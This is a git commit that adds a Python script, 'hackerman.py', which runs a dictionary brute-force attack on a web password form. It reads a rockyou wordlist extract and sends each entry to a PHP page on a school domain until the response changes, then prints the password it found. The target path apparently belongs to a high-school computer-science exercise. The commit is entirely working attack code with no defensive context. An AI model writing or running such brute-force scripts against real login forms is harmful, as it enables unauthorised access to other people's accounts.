c577aed9b9afcc28d5fbd0ad79762dbe483e46b4
thinkercat <darklevel@laposte.net>
2023-06-01 15:31:57 +0200

    01/06/2023

---
+++ python/web/hackerman.py
@@ -0,0 +1,17 @@
+import requests
+
+with open('extraitrockyou.txt') as file:
+    dictionnaire = file.read().splitlines()
+
+url = 'http://lyceevalois.com/nsi/form_cg/cible.php'
+
+invalid_password = requests.get(url,{'pass':''}).text
+print("Hacking ...")
+
+for attempt in range(len(dictionnaire)-1):
+    password = dictionnaire[attempt]
+    rqt = requests.get(f'{url}?pass={password}')
+
+    if rqt.text != invalid_password:
+        print(f'({rqt.status_code}) {attempt} : {password}')
+        break
